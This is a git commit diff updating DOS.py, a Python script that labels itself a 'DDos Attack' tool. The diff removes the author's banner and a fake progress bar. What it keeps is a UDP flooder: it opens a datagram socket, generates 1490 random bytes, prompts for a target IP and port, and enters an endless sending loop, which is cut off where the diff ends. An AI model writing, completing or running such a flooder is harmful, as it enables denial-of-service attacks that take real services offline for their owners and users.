4cfeee8bc4062841bc6682df177e8e5aef185905
tvp9999 <97007917+tvp9999@users.noreply.github.com>
2024-07-04 12:09:05 +0700

    Update DOS.py

--- DOS.py
+++ DOS.py
@@ -5,7 +5,6 @@ import socket
 import random
 from datetime import datetime
 
-
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -13,34 +12,14 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-##############
 
 os.system("clear")  
 os.system("figlet DDos Attack")
-print()
-print("Author   : TVP")
-print("You Tube : https://www.youtube.com/channel/UCi0umdDaKtK8kvqf2kNnfKQ")
-print("github   : https://github.com/tvp9999")
-print("Facebook : https://www.facebook.com/hoanganh.mai.9231712")
-print()
+
 ip = input("IP Target : ")
 port = int(input("Port       : "))
-
-os.system("clear")  
-os.system("figlet Attack Starting")
-print("[                    ] 0% ")
-time.sleep(3)
-print("[=====               ] 25%")
-time.sleep(3)
-print("[==========          ] 50%")
-time.sleep(3)
-print("[===============     ] 75%")
-time.sleep(3)
-print("[====================] 100%")
-time.sleep(2)
 
 sent = 0
 while True:
